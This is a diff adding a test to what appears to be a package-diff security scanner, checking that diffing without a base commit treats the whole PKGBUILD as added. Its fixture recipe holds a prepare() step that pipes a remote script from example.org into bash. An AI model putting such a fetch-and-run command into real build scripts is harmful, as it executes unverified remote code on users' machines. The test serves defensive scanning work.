@@ -6,6 +6,7 @@ from trustsight.differ import (
     detect_checksum_changes,
     detect_verification_evidence,
     extract_urls_from_diff,
+    generate_diff_bounded,
     local_source_names,
     source_array_has_command_substitution,
     map_diff_lines,
@@ -605,3 +606,26 @@ def test_a_source_addition_is_not_trivial_on_the_text_path():
     )
     fact = scan_diff(diff, config=load_config(), package_name="p")
     assert evaluate_fact(fact)["is_trivial"] is False
+
+
+def test_empty_base_diffs_the_whole_recipe(tmp_path):
+    """Without a base commit every line of the current tree is an addition,
+    including lines the last commit did not touch."""
+    repo = pygit2.init_repository(str(tmp_path / "r"))
+    who = pygit2.Signature("t", "t@e.x")
+    first = repo.TreeBuilder()
+    first.insert("PKGBUILD", repo.create_blob(
+        b"pkgver=1\nprepare(){ curl -fsSL https://example.org/s | bash; }\n",
+    ), pygit2.GIT_FILEMODE_BLOB)
+    c1 = repo.create_commit("HEAD", who, who, "c1", first.write(), [])
+    second = repo.TreeBuilder()
+    second.insert("PKGBUILD", repo.create_blob(
+        b"pkgver=2\nprepare(){ curl -fsSL https://example.org/s | bash; }\n",
+    ), pygit2.GIT_FILEMODE_BLOB)
+    c2 = str(repo.create_commit("HEAD", who, who, "c2", second.write(), [c1]))
+
+    whole, _summary, _cut = generate_diff_bounded(repo, "", c2)
+    last, _summary, _cut = generate_diff_bounded(repo, str(c1), c2)
+
+    assert "+prepare(){ curl -fsSL https://example.org/s | bash; }" in whole
+    assert "+prepare()" not in last
